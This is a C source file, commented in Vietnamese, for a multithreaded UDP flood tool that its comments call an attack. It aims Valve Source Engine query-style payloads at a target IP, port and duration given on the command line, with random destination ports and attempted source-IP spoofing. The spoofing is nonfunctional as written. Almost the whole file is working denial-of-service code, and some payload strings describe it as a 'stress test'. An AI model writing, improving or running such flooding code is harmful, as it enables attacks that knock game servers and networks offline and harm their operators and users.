#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <netinet/in.h>

#define DEFAULT_PACKET_SIZE 1024   // Kích thước gói tin mặc định
#define BURST_SIZE 1024           // Tăng cường số lượng gói trong một burst
#define NUM_THREADS 8             // Tăng số lượng threads
#define MAX_IP 255                // Số lượng địa chỉ IP giả mạo có thể được tạo

const char *vse_payloads[] = {
    "\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79",
    "\xFF\xFF\xFF\xFF\x56\x53\x45\x51\x55\x45\x52\x59",
    "\xFF\xFF\xFF\xFF\x67\x65\x74\x63\x68\x61\x6C\x6C\x65\x6E\x67\x65\x20\x73\x74\x65\x61\x6D\x69\x64",
    "\xFF\xFF\xFF\xFF\x55\x44\x50\x20\x4C\x6F\x61\x64",
    "\xFF\xFF\xFF\xFF\x50\x49\x4E\x47\x20\x54\x4F\x20\x41\x4C\x4C",
    "\xFF\xFF\xFF\xFF\x47\x45\x54\x20\x53\x45\x52\x56\x45\x52\x20\x49\x4E\x46\x4F",
    "\xFF\xFF\xFF\xFF\x53\x45\x52\x56\x45\x52\x20\x44\x41\x54\x41",
    "\xFF\xFF\xFF\xFF\x44\x41\x54\x41\x20\x42\x4C\x41\x43\x4B\x4C\x49\x53\x54",
    "\xFF\xFF\xFF\xFF\x50\x4F\x57\x45\x52\x20\x55\x50",
    "\xFF\xFF\xFF\xFF\x4D\x41\x58\x20\x54\x52\x41\x46\x46\x49\x43",
    "\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65\x20\x54\x72\x61\x63\x6B\x20\x51\x75\x65\x72\x79"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A"
    "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x21\x40\x23\x24\x25\x5E\x26\x2A\x28\x29\x5F\x2B",
    "\xFF\xFF\xFF\xFF\x43\x68\x61\x6C\x6C\x65\x6E\x67\x65\x20\x50\x6C\x61\x79\x65\x72"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A"
    "\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F",
    "\xFF\xFF\xFF\xFF\x53\x65\x72\x76\x65\x72\x20\x49\x6E\x66\x6F\x20\x52\x65\x71\x75\x65\x73\x74"
    "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9"
    "\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF",
    "\xFF\xFF\xFF\xFF\x50\x6C\x61\x79\x65\x72\x20\x4C\x69\x73\x74"
    "\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9"
    "\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF",
    "\xFF\xFF\xFF\xFF\x47\x65\x74\x53\x65\x72\x76\x65\x72\x52\x65\x73\x70\x6F\x6E\x73\x65"
    "\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF",
    "\xFF\xFF\xFF\xFF\x43\x68\x61\x6C\x6C\x65\x6E\x67\x65\x20\x53\x74\x61\x74\x73"
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    "\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F",
    "\xFF\xFF\xFF\xFF\x53\x65\x72\x76\x65\x72\x20\x43\x68\x61\x6C\x6C\x65\x6E\x67\x65"
    "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49"
    "\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F",
    "\xFF\xFF\xFF\xFF\x50\x6C\x61\x79\x65\x72\x20\x49\x6E\x66\x6F"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79"
    "\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F",
    "\xFF\xFF\xFF\xFF\x52\x65\x71\x75\x65\x73\x74\x20\x43\x68\x61\x6C\x6C\x65\x6E\x67\x65"
    "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9"
    "\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF",
    "\xFF\xFF\xFF\xFF\x4D\x61\x70\x20\x52\x6F\x74\x61\x74\x69\x6F\x6E"
    "\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9"
    "\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF",
    "\xFF\xFF\xFF\xFF\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56"
    "\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76"
    "\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x21\x40\x23\x24\x25\x26\x2A\x28\x29\x2B\x2D\x2E",
    "\xFF\xFF\xFF\xFF\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76"
    "\x77\x78\x79\x7A\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56"
    "\x57\x58\x59\x5A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x21\x40\x23\x24\x25\x26\x2A\x28\x29\x2B\x2D\x2E",
    "\xFF\xFF\xFF\xFF\x70\x61\x79\x6C\x6F\x61\x64\x20\x66\x6F\x72\x20\x73\x74\x72\x65\x73\x73\x20\x74\x65\x73"
    "\x74\x69\x6E\x67\x20\x61\x6E\x64\x20\x6D\x65\x61\x73\x75\x72\x69\x6E\x67\x20\x70\x65\x72\x66\x6F\x72\x6D"
    "\x61\x6E\x63\x65\x20\x6F\x6E\x20\x61\x20\x6E\x65\x74\x77\x6F\x72\x6B\x20\x73\x65\x72\x76\x65\x72\x2E",
    "\xFF\xFF\xFF\xFF\x6D\x61\x78\x69\x6D\x69\x7A\x65\x20\x70\x61\x79\x6C\x6F\x61\x64\x20\x73\x69\x7A\x65\x20"
    "\x66\x6F\x72\x20\x68\x69\x67\x68\x2D\x74\x72\x61\x66\x66\x69\x63\x20\x74\x65\x73\x74\x69\x6E\x67\x20\x61"
    "\x6E\x64\x20\x6D\x65\x61\x73\x75\x72\x69\x6E\x67\x20\x6E\x65\x74\x77\x6F\x72\x6B\x20\x70\x65\x72\x66\x6F"
    "\x72\x6D\x61\x6E\x63\x65\x2E\x20\x54\x68\x69\x73\x20\x69\x73\x20\x61\x20\x73\x74\x72\x65\x73\x73\x20\x74"
    "\x65\x73\x74\x2E"
};

// Thông tin cho mỗi thread
typedef struct {
    int sock;
    struct sockaddr_in target;
    double duration;
    int pps;
    struct sockaddr_in source;
} ThreadArgs;

// Hàm để tạo địa chỉ IP ngẫu nhiên cho giả mạo
struct in_addr generate_random_ip() {
    struct in_addr addr;
    addr.s_addr = htonl((rand() % MAX_IP) << 24 | (rand() % MAX_IP) << 16 | (rand() % MAX_IP) << 8 | (rand() % MAX_IP));
    return addr;
}

// Hàm để tạo cổng ngẫu nhiên
int generate_random_port() {
    return rand() % 65535 + 1024;  // Sử dụng cổng từ 1024 đến 65535
}

// Hàm để thực hiện tấn công flood
void *generate_vse_flood(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;
    double sleep_time = (args->pps > 0) ? 1.0 / args->pps : 0;
    int num_payloads = sizeof(vse_payloads) / sizeof(vse_payloads[0]);

    uint64_t local_packets = 0, local_bytes = 0, local_fails = 0;
    double start_time = (double)time(NULL), current_time;

    while ((current_time = (double)time(NULL)) - start_time < args->duration) {
        for (int i = 0; i < BURST_SIZE; i++) {
            // Lựa chọn payload ngẫu nhiên
            char *payload = (char *)vse_payloads[rand() % num_payloads];
            char fixed_payload[DEFAULT_PACKET_SIZE];
            size_t payload_len = strlen(payload);
            if (payload_len > DEFAULT_PACKET_SIZE)
                payload_len = DEFAULT_PACKET_SIZE;
            memcpy(fixed_payload, payload, payload_len);

            // Giả mạo địa chỉ IP nguồn
            args->source.sin_addr = generate_random_ip();  // Gán phần sin_addr của sockaddr_in

            // Cập nhật cổng ngẫu nhiên cho mỗi gói tin
            args->target.sin_port = htons(generate_random_port()); // Cổng ngẫu nhiên

            ssize_t sent = sendto(args->sock, fixed_payload, DEFAULT_PACKET_SIZE, 0, (struct sockaddr *)&args->target, sizeof(args->target));
            if (sent > 0) {
                local_packets++;
                local_bytes += sent;
            } else {
                local_fails++;
            }
        }
        if (sleep_time > 0)
            usleep((useconds_t)(sleep_time * 1000000));  // Kiểm soát PPS
    }

    printf("VSE Flood Complete: Packets Sent: %lu, Bytes Sent: %lu, Failed Sends: %lu\n", local_packets, local_bytes, local_fails);
    pthread_exit(NULL);
}

// Hàm chính
int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s IP PORT TIME\n", argv[0]);
        return -1;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    double duration = atof(argv[3]);  // Thời gian tấn công

    // Tạo socket UDP
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Thiết lập địa chỉ IP và cổng mục tiêu
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    target.sin_addr.s_addr = inet_addr(ip);

    int pps = 500;  // Giới hạn PPS (Packets Per Second)

    pthread_t threads[NUM_THREADS];
    ThreadArgs args[NUM_THREADS];

    // Tạo và khởi tạo các thread
    for (int i = 0; i < NUM_THREADS; i++) {
        args[i].sock = sock;
        args[i].target = target;
        args[i].duration = duration;
        args[i].pps = pps;
        args[i].source.sin_addr = generate_random_ip();  // Gán phần sin_addr của sockaddr_in
        pthread_create(&threads[i], NULL, generate_vse_flood, &args[i]);
    }

    // Chờ các thread kết thúc
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    close(sock);
    return 0;
}
